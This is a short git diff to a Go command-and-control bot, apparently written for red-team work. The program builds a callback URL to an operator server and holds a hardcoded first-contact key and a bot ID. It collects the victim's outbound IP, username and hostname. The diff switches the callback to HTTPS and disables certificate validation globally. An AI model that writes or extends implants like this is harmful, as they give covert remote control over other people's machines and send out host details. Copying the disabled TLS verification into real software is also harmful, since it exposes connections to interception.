@@ -7,6 +7,7 @@ Current file is in construction and in debugging mode. Still learning golang...
 package main
 
 import (
+	"crypto/tls"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -39,12 +40,11 @@ var (
 	PORT string
 )
 
-
 // FIRSTCONTACTKEY is
 var FIRSTCONTACTKEY string = "dudeOurRedteamalreadyhaslike30C2already-Friend"
 
 // URL is url for callback
-var URL string = "http://" + SERVERIP + ":" + PORT
+var URL string = "https://" + SERVERIP + ":" + PORT
 
 // BOTID is
 var BOTID string
@@ -282,6 +282,10 @@ func randSleep(min, max int) time.Duration {
 }
 
 func main() {
+
+	// Testing out https request with no certificate validation
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+
 	ip := GetOutboundIP()
 	user, _ := user.Current()
 	osName, _ := os.Hostname()
